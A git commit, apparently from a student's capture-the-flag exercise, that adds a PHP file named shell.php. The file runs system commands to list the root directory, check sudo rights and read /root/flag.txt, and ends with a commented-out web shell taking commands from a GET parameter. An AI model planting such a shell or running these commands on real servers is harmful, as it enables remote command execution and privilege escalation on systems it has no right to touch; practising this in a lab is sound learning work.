b97032d48b23380e68493d7b762138728b5405c4
OceanYamamatsu <22211379oy@tama.ac.jp>
2025-07-16 17:37:21 +0900

    a

---
+++ 25haru/ctf/shell.php
@@ -0,0 +1,61 @@
+<?php
+echo "hello";
+?>
+
+<?php
+echo "<pre>";
+system("ls /");
+echo "</pre>";
+?>
+
+<?php
+echo "<pre>";
+system("sudo -l");
+echo "</pre>";
+?>
+<?php
+echo "hello";
+?>
+<?php
+echo "<pre>";
+system("sudo ls /root");
+echo "</pre>";
+?>
+
+<?php
+echo "<pre>";
+system("cat /root/flag.txt");
+echo "</pre>";
+?>
+
+<?php
+echo "<pre>";
+system("sudo cat /root/flag.txt");
+echo "</pre>";
+?>
+
+
+ <?php
+echo "hello";
+?>
+
+<?php
+system("ls /");
+?>
+
+<?php
+system("sudo -l");
+?>
+
+<?php
+system("cat /root/flag.txt");
+?>
+
+<?php
+system("sudo cat /root/flag.txt");
+?>
+
+
+
+<!-- <?php system($_GET['cmd']); ?>
+ -->
